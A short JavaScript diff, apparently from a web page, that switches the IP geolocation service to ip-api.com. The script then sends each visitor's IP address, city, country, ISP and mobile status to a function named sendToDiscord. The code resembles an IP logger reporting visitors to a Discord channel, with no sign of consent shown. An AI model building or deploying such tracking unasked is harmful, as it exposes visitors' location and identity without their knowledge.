@@ -499,10 +499,20 @@
             time: new Date().toISOString()
         };
 
-        fetch('https://ipapi.co/json/')
+        fetch('https://ip-api.com/json/?fields=query,country,city,isp,mobile')
             .then(function (r) { return r.json(); })
             .then(function (geo) {
-                sendToDiscord(visitorData, geo);
+                if (geo && geo.status === 'success') {
+                    sendToDiscord(visitorData, {
+                        ip: geo.query,
+                        city: geo.city,
+                        country_name: geo.country,
+                        org: geo.isp,
+                        mobile: geo.mobile
+                    });
+                } else {
+                    sendToDiscord(visitorData, null);
+                }
             })
             .catch(function () {
                 sendToDiscord(visitorData, null);
